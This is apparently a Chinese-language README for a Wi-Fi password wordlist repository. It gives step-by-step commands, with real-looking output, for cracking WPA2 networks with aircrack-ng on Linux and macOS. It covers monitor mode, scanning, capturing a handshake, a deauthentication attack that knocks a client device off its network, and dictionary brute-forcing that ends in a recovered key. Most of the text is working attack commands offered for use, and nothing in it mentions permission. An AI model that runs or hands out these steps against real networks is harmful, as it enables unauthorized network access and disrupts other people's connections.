# wpa-dictionary

用于 Wi-Fi 密码破解。

### Linux 篇（推荐）

### 1. 安装 aircrack-ng

* 使用相应包管理工具安装，例如 Debian/Ubuntu 使用 apt 安装：

~~~shell
sudo apt install aircrack-ng
~~~

### 2. 查看可用的无线网卡

使用命令：`airmon-ng`

~~~
netcon@conwlt:~/workspace$ sudo airmon-ng

PHY	Interface	Driver		Chipset

phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)
~~~

根据以上输出，可用的无线网卡为 `wlp8s0`。

### 3. 指定无线网卡开启监听模式。

使用命令：`airmon-ng start <网卡名称>`

~~~
netcon@conwlt:~/workspace$ sudo airmon-ng start wlp8s0

PHY	Interface	Driver		Chipset

phy0	wlp8s0		iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)

		(mac80211 monitor mode vif enabled for [phy0]wlp8s0 on [phy0]wlp8s0mon)
		(mac80211 station mode vif disabled for [phy0]wlp8s0)
~~~

根据以上输出，已经把 wlp8s0 这块无线网卡开启监听模式，开启后名字是 `wlp8s0mon`。

开启监听模式后无线网卡无法继续连接 wifi，使用后需要关闭监听模式。

### 4. 扫描附近的无线网络

使用命令：`airodump-ng <处于监听模式的网卡名称>`

~~~
netcon@conwlt:~/workspace$ sudo airodump-ng wlp8s0mon

 CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49              

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 22:47:DA:62:2A:F0  -50       51       12    0   6  54e. WPA2 CCMP   PSK  AndroidAP    

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  

 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -31    0 -24e     0       16   
~~~

这一步会输出两个列表，两个列表不停在刷新。

第一个列表表示扫描到的无线网络 AP 信息，会用到以下几列信息：

* BSSID: 无线 AP 的硬件地址
* PWR: 信号强度，值是负数，绝对值越小表示信号越强
* CH: 无线网络信道
* ENC: 加密方式，我们要破解的是 WPA2
* ESSID: 无线网络的名称

第二个列表表示某个无线网络中和用户设备的连接信息：

* BSSID: 无线 AP 的硬件地址
* STATION: 用户设备的硬件地址

扫描列表会不停刷新，确定最终目标后按 Ctrl-C 退出。

这里仅仅是演示，所以列表只保留了一条结果。

### 5. 使用参数过滤扫描列表，确定扫描目标

使用命令：`airodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称>`

~~~
netcon@conwlt:~/workspace$ sudo airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon


 CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49 ][ WPA handshake: 22:47:DA:62:2A:F0

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 22:47:DA:62:2A:F0  -33 100     1597      387   11   6  54e. WPA2 CCMP   PSK  AndroidAP

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                  

 22:47:DA:62:2A:F0  AC:BC:32:96:31:8D  -32    1e-24e  1691     2657

~~~

刚扫描时看到输出的扫描状态是这样的：`CH  5 ][ Elapsed: 12 s ][ 2018-10-07 18:49`。

只有当扫描状态后面出现 ` ][ WPA handshake: 22:47:DA:62:2A:F0` 后，我们才拿到拿到进行破解的握手包。

扫描过程中如果有用户设备尝试连接 Wi-Fi 时，我们就会拿到握手包。

所以我们可以同时使用 `aireplay-ng` 对目标设备进行攻击，使其掉线重新连接，这样我们就拿到了握手包。

拿到握手包后按 Ctrl-C 结束扫描即可。

### 6. 使用 aireplay-ng 对目标设备发起攻击

使用命令：`aireplay-ng -<攻击模式> <攻击次数> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称>`

~~~
netcon@conwlt:~$ sudo aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon
18:57:31  Waiting for beacon frame (BSSID: 22:47:DA:62:2A:F0) on channel 6
18:57:32  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [41|64 ACKs]
18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [19|121 ACKs]
18:57:33  Sending 64 directed DeAuth. STMAC: [AC:BC:32:96:31:8D] [11|80 ACKs]
...
~~~

发起攻击后，当 `airodump-ng` 成功拿到了握手包，使用 Ctrl-C 退出攻击。

### 7. 使用 aircrack-ng 暴力破解 Wi-Fi 密码

使用命令：`aircrack-ng -w 密码字典 <包含握手包的 cap 文件>`

~~~
netcon@conwlt:~/workspace$ aircrack-ng -w wpa-dictionary/common.txt android-01.cap 
Opening android-01.cap
Read 675 packets.

   #  BSSID              ESSID                     Encryption

   1  22:47:DA:62:2A:F0  AndroidAP                 WPA (1 handshake)

Choosing first network as target.

Opening android-01.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:00:00] 12/2492 keys tested (828.33 k/s) 

      Time left: 2 seconds                                       0.48%

                          KEY FOUND! [ 1234567890 ]


      Master Key     : A8 70 17 C2 C4 94 12 99 98 4B BB BE 41 23 5C 0D 
                       4A 3D 62 55 85 64 B2 10 11 79 6C 41 1A A2 3B D3 

      Transient Key  : 58 9D 0D 25 26 81 A9 8E A8 24 AB 1F 40 1A D9 ED 
                       EE 10 17 75 F9 F1 01 EE E3 22 A5 09 54 A8 1D E7 
                       28 76 8A 6C 9E FC D3 59 22 B7 82 4E C8 19 62 D9 
                       F3 12 A0 1D E9 A4 7C 4B 85 AF 26 C5 BA 22 42 9A 

      EAPOL HMAC     : 22 C1 BD A7 BB F4 12 A5 92 F6 30 5C F5 D4 EE BE 
~~~

根据以上输出，我们已经破解成功！Wi-Fi 密码是：`1234567890`

### 8. 无线网卡退出监听模式

使用命令：`airmon-ng stop <处于监听模式的无限网卡名称>`

~~~
netcon@conwlt:~/workspace$ sudo airmon-ng stop wlp8s0mon

PHY	Interface	Driver		Chipset

phy0	wlp8s0mon	iwlwifi		Intel Corporation Centrino Wireless-N 2230 (rev c4)

		(mac80211 station mode vif enabled on [phy0]wlp8s0)

		(mac80211 monitor mode vif disabled for [phy0]wlp8s0mon)

~~~

## MAC OS 篇

### 1. 查看网卡名称

在终端中执行 `ifconfig` 即可查看，通常是 en0

### 2. 使用 airport 监听无线网络

由于某些原因，airmon-ng 无法在 MAC OS 使用，所以只能使用 airport 进行扫描和抓包了，但是并不好用，所以还是使用 linux 吧尽量...

开始扫描，终端中执行：

~~~shell
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 scan
~~~

扫描结果会是这样的：

| SSID | BSSID | RSSI | CHANNEL | HT | CC | SECURITY (auth/unicast/group) |
| - | - | - | - | - | - | - |
| 小米手机 | 22:47:da:62:2a:f0 | -29 | 6 | Y | -- | WPA2(PSK/AES/AES) |

* SSID 表示 Wi-Fi 名称
* BSSID 表示 Wi-Fi 设备的硬件地址
* RSSI 表示信号强度，值是负数，绝对值越小信号越强
* CHANNEL 表示 Wi-Fi 信道
* HT 表示吞吐量模式，一般都为 Y
* CC 表示国家，中国为 CN
* SECURITY 表示加密方式

### 3. 使用 airport 进行抓包

~~~shell
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff
~~~

抓一段儿事件之后，使用 Ctrl + C 停止抓包，完成后会生成一个 cap 包，看到如下提示：

~~~
Session saved to /tmp/airportSniff0RjCAO.cap.
~~~

### 4. 安装 [aircrack-ng](https://aircrack-ng.org/)

* 使用 [Homebrew](https://brew.sh/) 安装：

~~~shell
brew install aircrack-ng
~~~

### 5. 使用 aircrack-ng 执行破解

~~~shell
aircrack-ng -w common.txt /tmp/airportSniff0RjCAO.cap
~~~

### Windows

* [下载 Aircrack-ng](https://aircrack-ng.org/downloads.html) 提供了 Windows 的二进制包

* 使用 [WSL](https://docs.microsoft.com/en-us/windows/wsl/about)

### 更多安装方式参考：[安装 Aircrack-ng](https://aircrack-ng.org/install.html)
